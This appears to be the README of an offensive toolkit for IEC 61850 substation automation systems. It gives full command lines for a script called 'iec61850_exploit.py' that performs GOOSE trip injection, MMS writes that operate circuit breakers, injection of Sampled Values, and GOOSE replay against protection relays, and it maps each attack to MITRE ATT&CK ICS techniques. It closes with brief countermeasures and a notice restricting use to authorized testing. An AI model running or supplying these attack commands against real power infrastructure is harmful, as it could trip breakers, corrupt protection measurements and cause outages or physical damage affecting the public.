# IEC 61850 Security Assessment Framework

Comprehensive security assessment toolkit for IEC 61850 substation automation systems targeting GOOSE, MMS, and Sampled Values protocols.

## Protocol Coverage

**IEC 61850-8-1 (GOOSE)**: Generic Object Oriented Substation Event  
**ISO 9506 (MMS)**: Manufacturing Message Specification  
**IEC 61850-9-2 (SV)**: Sampled Values  
**IEEE 1588 (PTP)**: Precision Time Protocol

## Attack Capabilities

### GOOSE Attacks
- Trip command injection
- Circuit breaker control
- Status manipulation
- Message replay from pcap
- Subscription hijacking

### MMS Attacks
- Variable read/write
- Domain enumeration
- Parameter modification
- Control command injection

### Sampled Values Attacks
- Measurement poisoning
- Voltage/current injection
- Merging unit spoofing

### Time Synchronization Attacks
- PTP master spoofing
- Clock skew injection

## Installation

```bash
pip install -r requirements.txt
```

**Requirements**: Root/Administrator privileges for Layer 2 attacks

## Usage Examples

### Device Discovery

```bash
python iec61850_exploit.py -t 192.168.1.100 -m 00:11:22:33:44:55 --discover -i eth0
```

### GOOSE Trip Attack

```bash
python iec61850_exploit.py -t 192.168.1.100 -m 00:11:22:33:44:55 \
    --goose-trip \
    --gocb "PROT_RELAY/LLN0\$GO\$gcb01" \
    --dataset "PROT_RELAY/LLN0\$dataset01" \
    --app-id 0x0001
```

### MMS Variable Read

```bash
python iec61850_exploit.py -t 192.168.1.100 \
    --mms-read \
    --domain "PROT" \
    --variable "CircuitBreaker.Pos.stVal"
```

### MMS Variable Write

```bash
python iec61850_exploit.py -t 192.168.1.100 \
    --mms-write \
    --domain "CTRL" \
    --variable "Breaker.Operate" \
    --value "true"
```

### Sampled Values Injection

```bash
python iec61850_exploit.py -t 192.168.1.100 -m 00:11:22:33:44:55 \
    --sv-inject \
    --sv-id "MU01" \
    --sv-count 1000
```

### GOOSE Replay Attack

```bash
python iec61850_exploit.py -t 192.168.1.100 -m 00:11:22:33:44:55 \
    --goose-replay captured_goose.pcap \
    --replay-count 50
```

## MITRE ATT&CK ICS Mapping

- **T0815**: Denial of Service
- **T0830**: Man in the Middle
- **T0832**: Manipulation of Control
- **T0836**: Modify Parameter
- **T0840**: Network Connection Enumeration
- **T0855**: Unauthorized Command Message
- **T0857**: System Firmware
- **T0858**: Change Operating Mode
- **T0861**: Point & Tag Identification

## Technical Details

### GOOSE Protocol

**Ethertype**: 0x88B8  
**Multicast MAC**: 01:0C:CD:01:00:XX  
**VLAN**: Optional (typically 4-7 for protection)

GOOSE messages are Layer 2 multicast, making them susceptible to:
- Spoofing (no authentication in standard IEC 61850-8-1)
- Replay attacks
- Man-in-the-middle
- Denial of service via message flooding

### MMS Protocol

**Port**: 102/TCP  
**Transport**: ISO COTP over TCP/IP

MMS provides object-oriented access to substation devices:
- Read/Write data attributes
- Control operations
- File transfer
- No mandatory authentication in many implementations

### Sampled Values

**Ethertype**: 0x88BA  
**Multicast MAC**: 01:0C:CD:04:00:XX  
**Sample Rate**: 80 samples/cycle (4000 Hz for 50 Hz systems)

High-speed measurement streaming vulnerable to:
- Measurement poisoning
- Phase angle manipulation
- Quality bit tampering

## Countermeasures

1. **IEC 62351**: Implement security extensions
   - IEC 62351-6: GOOSE/SV security
   - IEC 62351-3: MMS security (TLS)

2. **Network Segmentation**: Isolate process bus from station bus

3. **VLAN Isolation**: Separate protection traffic

4. **Intrusion Detection**: Monitor for anomalous GOOSE/SV traffic

5. **Physical Security**: Secure network infrastructure

## Legal Notice

FOR AUTHORIZED SECURITY TESTING ONLY. Unauthorized access to industrial control systems is illegal. Use only on systems you own or have explicit written permission to test.

## References

- IEC 61850-8-1: Communication networks and systems for power utility automation
- IEC 62351: Power systems management and associated information exchange - Data and communications security
- ISO 9506: Industrial automation systems - Manufacturing Message Specification
